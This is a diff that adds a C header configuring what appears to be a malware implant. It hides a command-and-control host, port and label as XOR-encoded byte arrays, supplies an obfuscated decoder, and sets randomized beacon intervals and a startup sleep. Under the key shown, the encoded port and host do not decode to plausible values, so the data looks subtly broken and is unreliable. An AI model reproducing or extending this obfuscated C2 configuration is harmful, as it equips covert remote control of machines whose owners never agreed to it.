@@ -1,0 +1,23 @@
+#ifndef CONFIG_H
+#define CONFIG_H
+#define XK 0x4D
+static const unsigned char _c2_host_enc[] =
+    {0x75,0x7C,0x78,0x11,0x7B,0x7C,0x7F,0x11,0x7B,0x11,0x79,0x7E,0x7E};
+static const unsigned char _c2_port_enc[] =
+    {0x06,0x1E,0x1F,0x1D,0x1C};
+static const unsigned char _c2_label_enc[] =
+    {0x2E,0x20,0x21,0x11,0x2C,0x21,0x21,0x23,0x7C,0x11,0x28,0x21,0x29,0x27,0x24,0x7C,0x11,
+     0x25,0x24,0x23,0x21,0x24,0x27};
+#define ENC_LEN(arr) (sizeof(arr))
+static inline void vqxtnmbr(const unsigned char *in, size_t len, char *out) {
+    for (size_t i = 0; i < len; i++)
+        out[i] = (char)(in[i] ^ XK);
+    out[len] = '\0';
+}
+#define DECL_STR(name, arr) \
+    char name[sizeof(arr)+1]; \
+    vqxtnmbr(arr, sizeof(arr), name)
+#define BEACON_MIN 15
+#define BEACON_MAX 45
+#define STARTUP_SLEEP 20
+#endif 
